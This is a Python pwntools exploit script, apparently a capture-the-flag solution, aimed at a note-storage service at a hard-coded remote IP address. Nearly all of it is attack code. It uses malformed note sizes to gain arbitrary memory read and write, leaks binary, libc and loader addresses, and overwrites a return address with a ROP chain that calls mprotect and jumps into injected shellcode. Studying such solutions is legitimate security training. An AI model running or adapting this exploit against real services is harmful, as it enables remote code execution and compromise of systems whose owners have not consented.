#!/usr/bin/env python2

from pwn import *
#from pwn.shellcraft.amd64 import linux as scm
from pwnlib.shellcraft.amd64 import linux as scm
import os

c = remote('52.4.157.141', 1337)
#c = remote('127.0.0.1', 1337)

def new_note(size):
    c.send(p32(0))
    c.send(p64(size))
    return u32(c.recvn(4))

def write_note(nid, data, skip_read=False):
    c.send(p32(1))
    c.send(p32(nid))
    c.send(p64(len(data)))
    c.send(data)
    if not skip_read:
        return u32(c.recvn(4))

def read_note(nid, length):
    c.send(p32(2))
    c.send(p32(nid))
    c.send(p64(length))
    data = b''
    while True:
        data += c.recv()
        if u32(data[-4:]) == len(data) - 4:
            return data[:-4]

def delete_note(nid):
    c.send(p32(4))
    c.send(p32(nid))
    return u32(c.recvn(4))

def disable_note(nid):
    c.send(p32(3))
    c.send(p32(nid))
    return u32(c.recvn(4))

def quit():
    c.send(p32(5))


ctrlid = None
def readmem(addr, size):
    write_note(ctrlid, p64(0x1337) + p64(addr) + p64(size) + p64(1))
    return read_note(0x1337, size)

def readptr(addr):
    return u64(readmem(addr, 8))

def writemem(addr, data, skip_read=False):
    write_note(ctrlid, p64(0x1337) + p64(addr) + p64(len(data)) + p64(1))
    return write_note(0x1337, data, skip_read)

def pwn():
    global ctrlid

    new_note(1)
    new_note(1)

    # Need 2, no idea why
    print(new_note(0xffffffffffffffff))
    print(new_note(0xffffffffffffffff))

    print(disable_note(0x1))

    ctrlid = new_note(32)
    print(write_note(ctrlid, p64(0x1337) + p64(0x0) + p64(32) + p64(1)))
    print(delete_note(0x1337))
    new_note(50)
    resp = read_note(ctrlid, 32)
    nid, ptr, size, in_use = struct.unpack('<QQQQ', resp)

    print("heap chunk @ 0x{:x}".format(ptr))

    writemem(ptr, b'Pwned')
    print(readmem(ptr, 5))

    binary = u64(readmem((ptr & ~0xfff) + 0x968, 0x8)) & ~0xfff 
    binary -= 0x4000
    print("binary @ 0x{:x}".format(binary))
    #print(readmem(binary + 0x2fbf, 15))


    kill_got = 0x204f28 + binary
    libc = readptr(kill_got) - 0x0000000000036fb0

    _rtld_global_got = libc + 0x3bdde8
    libld = readptr(_rtld_global_got) - 0x1060

    print("libld @ 0x{:x}".format(libld))

    stack_end = readptr(libld + 0xe60)

    print("stack end @ 0x{:x}".format(stack_end))

    ret_addr = stack_end -0x1000 + 0xe18

    flag_str = binary + 0x2fbf

    pop_rdi = libc + 0x22b1a
    pop_rsi = libc + 0x24805
    pop_rdx = libc + 0x1b8e

    sc_addr = binary + 0x205000

    os.system('nasm ./shellcode64.asm')
    with open('./shellcode64', 'r') as sc_fd:
        sc = sc_fd.read()

    writemem(sc_addr+0x500, sc)

    rop = ''
    rop += p64(pop_rdi)
    rop += p64(sc_addr)
    rop += p64(pop_rsi)
    rop += p64(4096)
    rop += p64(pop_rdx)
    rop += p64(7)
    rop += p64(libc + 0xf4a20) #mprotect
    rop += p64(sc_addr+0x500)

    writemem(ret_addr, rop, skip_read=True)
    ret = u64(c.read(8))
    print 'ret: 0x{:x}'.format(ret)
    #print ptrs.encode('hex')
    #assert ptrs[:8] == ptrs[8:]
    #mapped = u64(ptrs[:8])
    #print 'mmap: 0x{:x}'.format(mapped)


pwn()

c.clean_and_log()
